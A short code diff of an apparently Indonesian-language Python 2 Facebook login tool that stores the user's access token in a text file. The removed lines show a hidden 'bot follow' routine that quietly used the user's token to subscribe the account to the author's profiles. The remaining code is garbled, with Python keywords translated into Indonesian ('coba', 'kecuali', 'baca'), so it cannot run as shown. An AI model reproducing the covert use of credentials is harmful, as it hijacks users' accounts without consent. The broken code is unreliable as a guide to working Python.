@@ -103,20 +103,11 @@ def login():
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
-			#-> bot follow
-			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      # Raka Andrian Tara
-			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      # RAKA THE KING
-			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      # MANTAN GARANGAN
-			requests.post("https://graph.facebook.com/532301703502197/subscribers?access_token="+token)      # Pansfage
-			menu()
-		except KeyError:
-			os.system("rm -f login.txt")
-			exit("[?] Login Error")
 
 ### RAKA ANDRIAN ###
 def  raka_bangsatxd ():
 	coba :
-		toket = buka ( 'login.txt' , 'r' ). baca ()
+		token = open ( "login.txt" , "r" ). baca ()
 	kecuali  IOError :
 		print "\33[1;97m[!] Token tidak valid"
 		os . sistem ( 'rm -rf login.txt' )
